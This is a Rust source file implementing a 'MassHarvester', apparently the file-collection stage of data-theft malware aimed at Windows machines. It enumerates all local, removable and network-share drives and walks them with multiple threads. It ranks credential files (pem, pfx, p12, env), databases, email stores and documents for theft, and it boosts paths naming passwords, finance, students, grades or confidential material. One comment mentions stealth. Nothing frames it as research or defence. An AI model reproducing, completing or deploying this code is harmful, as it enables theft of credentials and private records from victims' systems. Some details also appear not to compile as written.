use std::fs;
use std::path::{Path, PathBuf};
use walkdir::WalkDir;
use std::sync::{Arc, Mutex, mpsc};
use std::thread;
use std::time::{Duration, Instant};
use serde::{Serialize, Deserialize};
use regex::Regex;

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct FileEntry {
    pub path: PathBuf,
    pub size: u64,
    pub modified: u64,
    pub priority: u32,
    pub file_type: FileType,
}

#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
pub enum FileType {
    Document,
    Database,
    Credential,
    Config,
    Image,
    Archive,
    Code,
    Other,
}

pub struct MassHarvester {
    max_file_size: u64,
    max_total_size: u64,
    priority_extensions: Vec<String>,
    exclude_paths: Vec<String>,
    harvested: Arc<Mutex<Vec<FileEntry>>>,
    total_size: Arc<Mutex<u64>>,
    should_stop: Arc<Mutex<bool>>,
}

impl MassHarvester {
    pub fn new() -> Self {
        Self {
            max_file_size: 100 * 1024 * 1024, // 100MB per file
            max_total_size: 50 * 1024 * 1024 * 1024, // 50GB total
            priority_extensions: Self::get_priority_extensions(),
            exclude_paths: Self::get_exclude_paths(),
            harvested: Arc::new(Mutex::new(Vec::new())),
            total_size: Arc::new(Mutex::new(0)),
            should_stop: Arc::new(Mutex::new(false)),
        }
    }
    
    fn get_priority_extensions() -> Vec<String> {
        vec![
            // Documents (highest priority)
            "doc".to_string(), "docx".to_string(), "pdf".to_string(),
            "xls".to_string(), "xlsx".to_string(), "ppt".to_string(),
            "pptx".to_string(), "txt".to_string(), "rtf".to_string(),
            "odt".to_string(), "ods".to_string(), "odp".to_string(),
            
            // Databases
            "db".to_string(), "sqlite".to_string(), "sqlite3".to_string(),
            "mdb".to_string(), "accdb".to_string(), "sql".to_string(),
            "bak".to_string(), "dump".to_string(),
            
            // Credentials/Configs
            "xml".to_string(), "json".to_string(), "ini".to_string(),
            "conf".to_string(), "config".to_string(), "yaml".to_string(),
            "yml".to_string(), "env".to_string(), "key".to_string(),
            "pem".to_string(), "pfx".to_string(), "p12".to_string(),
            
            // Archives
            "zip".to_string(), "rar".to_string(), "7z".to_string(),
            "tar".to_string(), "gz".to_string(), "bz2".to_string(),
            
            // Email
            "pst".to_string(), "ost".to_string(), "eml".to_string(),
            "msg".to_string(), "mbox".to_string(),
            
            // Code (lower priority but still valuable)
            "py".to_string(), "js".to_string(), "php".to_string(),
            "java".to_string(), "cs".to_string(), "cpp".to_string(),
            "h".to_string(), "rs".to_string(), "go".to_string(),
        ]
    }
    
    fn get_exclude_paths() -> Vec<String> {
        vec![
            r"C:\Windows".to_string(),
            r"C:\Program Files".to_string(),
            r"C:\Program Files (x86)".to_string(),
            r"C:\$Recycle.Bin".to_string(),
            r"C:\ProgramData".to_string(),
            r"C:\PerfLogs".to_string(),
            r"C:\Temp".to_string(),
            std::env::temp_dir().to_string_lossy().to_string(),
        ]
    }
    
    pub fn harvest_all_drives(&self) -> Vec<FileEntry> {
        let drives = Self::enumerate_drives();
        let mut all_files = Vec::new();
        
        for drive in drives {
            if self.should_stop() {
                break;
            }
            
            let files = self.scan_drive(&drive);
            all_files.extend(files);
        }
        
        // Sort by priority (highest first)
        all_files.sort_by(|a, b| b.priority.cmp(&a.priority));
        
        all_files
    }
    
    fn enumerate_drives() -> Vec<PathBuf> {
        let mut drives = Vec::new();
        
        // System drive
        drives.push(PathBuf::from("C:\\"));
        
        // Other drives
        for letter in 'D'..='Z' {
            let drive = format!("{}:\\", letter);
            if Path::new(&drive).exists() {
                // Check if it's a network drive (skip for stealth)
                if !Self::is_network_drive(&drive) {
                    drives.push(PathBuf::from(drive));
                }
            }
        }
        
        // Network shares
        drives.extend(Self::enumerate_network_shares());
        
        // External drives
        drives.extend(Self::enumerate_external_drives());
        
        drives
    }
    
    fn is_network_drive(drive: &str) -> bool {
        use std::process::Command;
        
        let output = Command::new("cmd")
            .args(&["/c", &format!("net use {}", drive)])
            .output();
        
        if let Ok(out) = output {
            return out.status.success();
        }
        
        false
    }
    
    fn enumerate_network_shares() -> Vec<PathBuf> {
        let mut shares = Vec::new();
        
        let output = std::process::Command::new("net")
            .args(&["view"])
            .output();
        
        if let Ok(out) = output {
            let text = String::from_utf8_lossy(&out.stdout);
            for line in text.lines() {
                if line.starts_with("\\\\") {
                    shares.push(PathBuf::from(line.trim()));
                }
            }
        }
        
        shares
    }
    
    fn enumerate_external_drives() -> Vec<PathBuf> {
        let mut drives = Vec::new();
        
        unsafe {
            use windows::Win32::Storage::FileSystem::*;
            use windows::Win32::Foundation::*;
            
            let drives_bitmask = GetLogicalDrives();
            
            for i in 0..26 {
                if (drives_bitmask >> i) & 1 == 1 {
                    let drive_letter = format!("{}:\\", (b'A' + i as u8) as char);
                    let drive_type = GetDriveTypeA(
                        windows::core::PCSTR::from_raw(drive_letter.as_ptr())
                    );
                    
                    // Removable or fixed external
                    if drive_type == DRIVE_REMOVABLE || drive_type == DRIVE_FIXED {
                        drives.push(PathBuf::from(drive_letter));
                    }
                }
            }
        }
        
        drives
    }
    
    fn scan_drive(&self, drive: &Path) -> Vec<FileEntry> {
        let mut files = Vec::new();
        
        // Skip excluded paths
        if self.is_excluded(drive) {
            return files;
        }
        
        // Multi-threaded scanning
        let (tx, rx) = mpsc::channel();
        let should_stop = Arc::clone(&self.should_stop);
        
        let walker = WalkDir::new(drive)
            .max_depth(10)
            .follow_links(false)
            .same_file_system(false);
        
        let handles: Vec<_> = walker
            .into_iter()
            .filter_map(|e| e.ok())
            .filter(|e| e.file_type().is_file())
            .collect::<Vec<_>>()
            .chunks(1000)
            .map(|chunk| {
                let tx = tx.clone();
                let chunk = chunk.to_vec();
                let should_stop = Arc::clone(&should_stop);
                
                thread::spawn(move || {
                    for entry in chunk {
                        if *should_stop.lock().unwrap() {
                            break;
                        }
                        
                        if let Some(file_entry) = Self::process_file_entry(&entry) {
                            let _ = tx.send(file_entry);
                        }
                    }
                })
            })
            .collect();
        
        drop(tx);
        
        for entry in rx {
            if self.should_stop() {
                break;
            }
            
            // Check total size limit
            let current_size = *self.total_size.lock().unwrap();
            if current_size + entry.size > self.max_total_size {
                *self.should_stop.lock().unwrap() = true;
                break;
            }
            
            *self.total_size.lock().unwrap() += entry.size;
            files.push(entry);
        }
        
        for handle in handles {
            let _ = handle.join();
        }
        
        files
    }
    
    fn process_file_entry(entry: &walkdir::DirEntry) -> Option<FileEntry> {
        let path = entry.path();
        let metadata = entry.metadata().ok()?;
        
        // Skip system/hidden files
        if metadata.file_attributes() & 0x2 != 0 { // FILE_ATTRIBUTE_HIDDEN
            return None;
        }
        
        if metadata.file_attributes() & 0x4 != 0 { // FILE_ATTRIBUTE_SYSTEM
            return None;
        }
        
        let size = metadata.len();
        if size == 0 || size > 100 * 1024 * 1024 {
            return None;
        }
        
        let modified = metadata.modified()
            .ok()?
            .duration_since(std::time::UNIX_EPOCH)
            .ok()?
            .as_secs();
        
        let file_type = Self::classify_file(path);
        let priority = Self::calculate_priority(path, size, &file_type);
        
        Some(FileEntry {
            path: path.to_path_buf(),
            size,
            modified,
            priority,
            file_type,
        })
    }
    
    fn classify_file(path: &Path) -> FileType {
        let ext = path.extension()
            .and_then(|e| e.to_str())
            .unwrap_or("")
            .to_lowercase();
        
        match ext.as_str() {
            "doc" | "docx" | "pdf" | "txt" | "rtf" | "odt" => FileType::Document,
            "xls" | "xlsx" | "ods" | "csv" => FileType::Document,
            "ppt" | "pptx" | "odp" => FileType::Document,
            "db" | "sqlite" | "sqlite3" | "mdb" | "accdb" | "sql" => FileType::Database,
            "xml" | "json" | "ini" | "conf" | "config" | "env" => FileType::Config,
            "key" | "pem" | "pfx" | "p12" | "crt" | "cer" => FileType::Credential,
            "zip" | "rar" | "7z" | "tar" | "gz" | "bz2" => FileType::Archive,
            "jpg" | "jpeg" | "png" | "gif" | "bmp" | "tiff" => FileType::Image,
            "py" | "js" | "php" | "java" | "cs" | "cpp" | "h" | "rs" => FileType::Code,
            _ => FileType::Other,
        }
    }
    
    fn calculate_priority(path: &Path, size: u64, file_type: &FileType) -> u32 {
        let mut score = 0;
        
        // Base score by file type
        score += match file_type {
            FileType::Database => 100,
            FileType::Credential => 95,
            FileType::Config => 80,
            FileType::Document => 70,
            FileType::Archive => 60,
            FileType::Code => 40,
            FileType::Image => 20,
            FileType::Other => 10,
        };
        
        // Boost for interesting paths
        let path_str = path.to_string_lossy().to_lowercase();
        
        if path_str.contains("password") || path_str.contains("credential") {
            score += 50;
        }
        if path_str.contains("finance") || path_str.contains("budget") {
            score += 40;
        }
        if path_str.contains("student") || path_str.contains("grade") {
            score += 35;
        }
        if path_str.contains("research") || path_str.contains("confidential") {
            score += 30;
        }
        if path_str.contains("backup") || path_str.contains("archive") {
            score += 25;
        }
        
        // Boost for recent files (within 30 days)
        // Would check modified time here
        
        // Penalize very large files
        if size > 50 * 1024 * 1024 {
            score = score.saturating_sub(20);
        }
        
        score
    }
    
    fn is_excluded(&self, path: &Path) -> bool {
        let path_str = path.to_string_lossy().to_lowercase();
        self.exclude_paths.iter().any(|ex| path_str.starts_with(&ex.to_lowercase()))
    }
    
    fn should_stop(&self) -> bool {
        *self.should_stop.lock().unwrap()
    }
    
    pub fn stop(&self) {
        *self.should_stop.lock().unwrap() = true;
    }
    
    pub fn get_statistics(&self) -> HarvestStats {
        let files = self.harvested.lock().unwrap();
        let total_size = *self.total_size.lock().unwrap();
        
        HarvestStats {
            total_files: files.len(),
            total_size,
            by_type: self.count_by_type(&files),
        }
    }
    
    fn count_by_type(&self, files: &[FileEntry]) -> std::collections::HashMap<FileType, usize> {
        let mut counts = std::collections::HashMap::new();
        for file in files {
            *counts.entry(file.file_type.clone()).or_insert(0) += 1;
        }
        counts
    }
}

#[derive(Debug)]
pub struct HarvestStats {
    pub total_files: usize,
    pub total_size: u64,
    pub by_type: std::collections::HashMap<FileType, usize>,
}